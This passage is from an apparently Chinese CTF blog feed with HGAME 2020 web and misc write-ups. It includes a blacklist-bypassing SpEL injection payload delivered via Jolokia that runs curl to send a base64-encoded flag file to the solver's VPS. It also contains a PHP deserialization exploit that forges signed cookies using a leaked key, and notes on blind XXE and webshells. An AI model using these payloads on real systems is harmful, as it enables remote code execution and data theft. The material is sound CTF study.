&quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;user&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;name&quot;: &#123;</span><br><span class="line">                    &quot;value&quot;: &quot;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>由此我们可以知道blacklist和加密解密中的2个参数<br>再访问<br><a href="http://ezspel.hgame.wz22.cc/actuator/jolokia/list" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/jolokia/list</a><br>我们再来搜一搜出题人的名字(jqy)很容易就找到了关键部分(开玩笑的，一开始是肉眼找的，看见encrypt的字样感觉比较敏感才找到的)<br><img src="wp4_img/2.jpg" alt=""><br>根据出题人提供的两份资料，我们需要构造payload来执行命令读取flag，而加密与解密针对的是rememberMe，所以我们需要在其中替换rememberMe的值<br>先放出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;type&quot;:&quot;EXEC&quot;,</span><br><span class="line">   &quot;mbean&quot;:&quot;com.jqy.ezspel:Name=EncryptService&quot;,</span><br><span class="line">   &quot;operation&quot;:&quot;encrypt&quot;,</span><br><span class="line">   &quot;arguments&quot;:[&quot;hgamehgamehgame&#123;&quot;,&quot;spppelandjookiaa&quot;,&quot;#&#123;T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(ClassLoader).getSystemClassLoader().loadClass(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl http://_yourVPS:_apachePort/?flag=`cat flag`|base64\&quot;&#125;)&#125;&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>现在解释下第三个args<br>因为黑名单的限制，我们选择字符串拼接的方式绕过黑名单的检测，这里的黑名单比出题人提供的资料里增加了forName和getClass,这俩的作用是加载类,这里我们用ClassLoader代替，于是就有<em>ClassLoader.getSystemClassLoader().loadClass()</em>，为了转换为SpEL的形式，我们需要<em>#{T(ClassLoader).getSystemClassLoader().loadClass()}</em>  </p><p>(照搬出题人原话)<br>关于invoke：<br>在Java中,方法可以当做Method类的一个对象来看待。<br><em>a.print(b)==print.invoke(a,b)</em><br>print是个变量，定义为<em>Method print=A.class.getMethod(“print);</em><br>就是获取类A里面的这个print方法  </p><p>flag在根目录下所以直接cat flag，base64编码是因为某些特殊字符可能无法显示<br>先进行加密，因为之后网站会对rememberMe的值进行自动解密，将以上payload以JSON形式post至<a href="http://ezspel.hgame.wz22.cc/actuator/jolokia" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/actuator/jolokia</a><br>此时vps是没有接收到数据的，因为现在只是对数据进行了一个加密处理，然后我们看一下response<br><img src="wp4_img/6.png" alt=""><br>value所指的就是加密后的数据，我们把它放进cookie中的rememberMe中,然后直接GET访问<a href="http://ezspel.hgame.wz22.cc/" target="_blank" rel="noopener">http://ezspel.hgame.wz22.cc/</a><br>就好，在我们的服务器上查看apache日志就可以看见base64编码后的flag</p><h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>感觉这题是最难的- -<br><a href="https://github.com/vidar-team/Hgame2020_writeup/tree/master/week4" target="_blank" rel="noopener">official_wp</a><br><a href="https://www.gem-love.com/websecurity/1566.html" target="_blank" rel="noopener">HGAME 2020 Week 4 WEB”代打出题人服务中心” Writeup</a></p><p>这个看见截包时的data是xml形式的，并且无回显，有想到可能是BlindXXE,但是呢- -我发现输入’&lt;’时，返回的包会显示error(然而这里是我- -data数据不完整造成的)<br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">SSRF</a><br>我的理解是要攻击内网所以要获得服务器的相关信息，信息保存在/etc/hosts中<br>然后用php伪协议读取文件信息<br><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">XML与xxe注入基础知识</a><br><a href="https://wh0ale.github.io/2019/05/09/2019-5-9-%E6%80%BB%E7%BB%93%E4%B8%8B%E8%BF%99%E5%87%A0%E5%A4%A9%E6%89%B9%E9%87%8Fxxe%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/" target="_blank" rel="noopener">总结下这几天批量xxe遇到的坑</a><br><a href="https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/" target="_blank" rel="noopener">对于XXE漏洞的学习与实验复现记录</a><br>应该是hitcon2017的babyfirst改的<br>之前犯过一个小错误导致服务器接收不到信息- -，原因是没有把dtd文件放在根目录下，导致无法读取- -，这个问题本质是因为我还不理解这个payload是咋回事- -  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$token = @$_GET[<span class="string">'token'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($token)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"请带上您的队伍token访问! /?token="</span>);</span><br><span class="line">&#125;</span><br><span class="line">$api = <span class="string">"http://checker/?token="</span>.$token;</span><br><span class="line">$t = file_get_contents($api);</span><br><span class="line"><span class="keyword">if</span>($t !== <span class="string">"ok"</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"队伍token错误"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span>. md5(<span class="string">"hgame2020"</span> . $token);;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">$content = $_GET[<span class="string">'v'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($content)) &#123;</span><br><span class="line">    $cmd = substr($content,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'r'</span>])) &#123;</span><br><span class="line">    system(<span class="string">'rm -rf ./*'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _</span></span><br><span class="line"><span class="comment">  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |</span></span><br><span class="line"><span class="comment"> | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |</span></span><br><span class="line"><span class="comment">  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|</span></span><br><span class="line"><span class="comment"> |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)</span></span><br><span class="line"><span class="comment">                                    |/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9452263.html" target="_blank" rel="noopener">如何在命令长度受限的情况下成功get到webshell</a>  </p><p>= =这题还是没搞懂</p>]]></content>
      
      
      
        <tags>
            
            <tag> vidar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2020week3_wp</title>
      <link href="/2020/02/14/hgame2020week3-wp/"/>
      <url>/2020/02/14/hgame2020week3-wp/</url>
      
        <content type="html"><![CDATA[<p>这周qwq基本等于没有在写题…</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="序列之争"><a href="#序列之争" class="headerlink" title="序列之争"></a>序列之争</h2><p>啊…原来是要得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br></pre></td></tr></table></figure></p><p>这里的encryptKey QAQ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($playerName)</span></span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'player'</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看了hint,传入player=%s以此来得到$encryptKey<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;     <span class="comment">// 服务器的 Key</span></span><br><span class="line">    <span class="keyword">private</span> $key = <span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">($no)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Fight</span><span class="params">($monster)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($monster[<span class="string">'no'</span>] &gt;= <span class="keyword">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank -= rand(<span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rank &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;rank = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] += rand(<span class="number">20</span>, <span class="number">200</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">true</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:green;"&gt;Congratulations! You win! &lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="keyword">false</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:red;"&gt;You die!&lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'rank'</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 非正常访问</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $monsterData;</span><br><span class="line">    <span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;<span class="comment">//32是指md5的位数</span></span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $monsterName = [<span class="string">'无名小怪'</span>, <span class="string">'BOSS: The Kernal Cosmos'</span>, <span class="string">'小怪: Big Eggplant'</span>, <span class="string">'BOSS: The Mole King'</span>, <span class="string">'BOSS: Zero Zone Witch'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monsterData = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'name'</span> =&gt; $monsterName[array_rand($monsterName, <span class="number">1</span>)],</span><br><span class="line">            <span class="string">'no'</span> =&gt; rand(<span class="number">1</span>, <span class="number">2000</span>),</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;main role="main" class="inner cover"&gt;</span><br><span class="line">  &lt;h2 class="cover-heading"&gt;&lt;?php echo($game-&gt;welcomeMsg);?&gt;&lt;/h2&gt;</span><br><span class="line">  &lt;h1&gt;<span class="comment"># &lt;?php echo($game-&gt;rank-&gt;Get());?&gt;&lt;/h1&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span><br><span class="line">      &lt;h2&gt;hgame&#123;flag_is_here&#125;&lt;/h2&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span><br><span class="line">  &lt;br&gt;</span><br></pre></td></tr></table></figure><p>在Monster类里有反序列化函数unserialize(),而里面传入的内容是我们可以控制的cookie,所以可以通过这个函数来使得this-&gt;rank()==1。关于进入unserialize()之前所要达到的条件，其实执行一遍Monster类里Save()函数的内容就可以了:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data = [<span class="number">1</span>, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'rank'</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">($no)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Game();</span><br><span class="line">$res1=serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="comment">//print($res1);</span></span><br><span class="line">$key=<span class="string">'c4ca4238a0b923820dcc509a6f75849b4eb38c8d89d42dd45200003c8b7101c6'</span>;</span><br><span class="line">$sign = md5($res1 . $key);</span><br><span class="line">setcookie(<span class="string">'monster'</span>, base64_encode($res1 . $sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">print</span>($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>之后burpsuite拦截改cookie的值就可以了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="三重隐写"><a href="#三重隐写" class="headerlink" title="三重隐写"></a>三重隐写</h2><p>根据You konw LSB.wav先用silentEye把wav解码，出现key,用来解看起来很古风的mp3，得到flag.crypto，另一个mp3的图像是个条形码，在线解码一下。根据提供的工具，把条形码解码出的内容作为.crypto的key就可以得到flag</p><h1 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>官方wp给的资料(能读英文文章真是一项很重要的技能…)<br><a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">BREAKING PHP’S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE</a><br><a href="https://nosec.org/home/detail/3876.html" target="_blank" rel="noopener">中文翻译版</a><br><a href="https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py" target="_blank" 